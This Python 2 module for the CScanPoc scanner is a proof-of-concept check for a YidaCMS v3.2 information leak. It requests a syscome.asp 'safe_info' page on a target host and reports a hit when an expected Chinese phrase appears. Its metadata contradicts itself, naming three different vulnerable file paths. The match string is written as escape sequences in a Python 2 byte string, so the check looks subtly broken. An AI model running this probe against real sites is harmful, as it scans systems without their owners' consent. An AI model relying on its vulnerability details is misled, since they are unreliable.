# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'YidaCMS_0102'  # 平台漏洞编号，留空
    name = 'YidaCMS v3.2 /Yidacms/user/user.asp 信息泄漏'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
    漏洞文件：/Yidacms/admin/admin_syscome.asp。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://wooyun.org/bugs/wooyun-2014-074065
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YidaCMS(易达CMS)'  # 漏洞应用名称
    product_version = '3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7bcdbef9-3efa-43d5-9cbb-6ea9220a9dfe'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/yidawap/syscome.asp?stype=safe_info'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '\u670d\u52a1\u5668\u76f8\u5bf9\u4e0d\u5b89\u5168\u7684\u7ec4\u4ef6\u68c0\u6d4b' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
